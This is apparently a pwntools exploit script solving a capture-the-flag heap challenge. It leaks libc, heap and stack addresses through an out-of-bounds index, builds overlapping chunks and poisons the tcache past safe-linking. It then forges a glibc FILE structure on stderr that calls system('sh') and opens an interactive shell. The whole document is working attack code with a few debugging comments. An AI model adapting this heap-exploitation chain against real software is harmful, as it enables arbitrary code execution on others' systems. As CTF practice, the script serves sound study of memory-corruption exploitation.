from pwn import *
elf = context.binary = ELF("./chal")
libc = ELF("./libc.so.6")
context.terminal = 'kitty'
context.log_level = 'debug'
p = process(elf.path)


def add(size):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b">", size)
    p.sendafter(b">", b"\n")
    print(f"Chunk of size {size} allocated!")

def free(idx):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b">", idx)
    p.sendafter(b">", b"\n")
    
def view(idx):
    p.sendlineafter(b">", b"4")
    p.sendlineafter(b">", idx)
    p.recvline()
    leak = p.recvline()
    p.sendlineafter(b">", b"\n")
    return leak

def edit(idx, name, b=False):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b">", idx)
    res = p.recvline()
    if "not found" in res.decode():
        print(res.decode())
    if b:
        pause()
    p.sendafter(b">", name)
    p.sendlineafter(b">", b"\n")



leak = view(b"-6")
stdin = u64(leak[8:16]) - 132
print(hex(stdin))
add(b"40")
free(b"0")
add(b"40")
heap_leak = u64(view(b"0")[:8].ljust(8, b'\x00')) << 12
print("heap leak", hex(heap_leak))

add(b"56")
edit(b"0", b"chunk 0")
add(b"56")
add(b"248")
for i in range(7):
    add(b"248")

for i in range(4, 11):
    print(i)
    free(str(i).encode())
edit(b"2", b"A"*(56))
edit(b"1", p64(0) + p64(0x70) + p64(heap_leak+0x2d0)*2)
edit(b"2", b"\x00"*48 + p64(0x70))
free(b"3")

add(b"360")
add(b"56")
free(b"4")
free(b"2")

environ = stdin + 30608 - 16
edit(b"3", b"\x00"*48 + p64(((heap_leak + 0x550)>>12) ^ environ))
add(b"50")
add(b"50")
output = view(b"4")
stack_leak = u64(output[24:32])
print(hex(stack_leak))

stack_leak = stack_leak - 0x8 #alignement
pop_rdi = stdin - 1925931
libc.address = pop_rdi - 0x28795
system = stdin - 1742864
binsh = stdin - 255653

for i in range(7):
    add(b"248")

add(b"200") # prevent from going into top chunk thing (future me i dont think this does anything lol the bottom add 200 is the real guard)
add(b"56")
add(b"56")

add(b"248")
edit(b"14", b"A"*(56))
edit(b"13", p64(0) + p64(0x70) + p64(heap_leak+0xc60)*2)
edit(b"14", b"\x00"*48 + p64(0x70))
for i in range(5, 12):
    free(str(i).encode())
add(b"200") # prevent from going into top chunk thing (chunk 12)
free(b"15")
add(b"360")
add(b"56")

#edit big boi chunk 6
free(b"7")
free(b"14")
edit(b"6", b"\x00"*48 + p64(((heap_leak + 0xc70) >> 12) ^ (libc.sym._IO_2_1_stdin_+48-0x10)))
add(b"50")
gdb.attach(p)
add(b"50")
print("bruhbruhbruh:", hex(stack_leak))

stderr = libc.sym._IO_2_1_stderr_

stderr_addr = libc.sym._IO_2_1_stderr_

fs = FileStructure()
fs.flags = u64("  " + "sh".ljust(6, "\x00"))
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = stderr_addr-0x10 # Should be null
fs.chain = libc.sym.system
fs._codecvt = stderr_addr
# stderr becomes it's own wide data vtable
# Offset is so that system (fs.chain) is called
fs._wide_data = stderr_addr - 0x48
fs.vtable = libc.sym._IO_wfile_jumps

edit(b'8', flat(
    p64(stderr)*4, stderr+len(bytes(fs))+1
))

p.send(bytes(fs))

p.interactive()

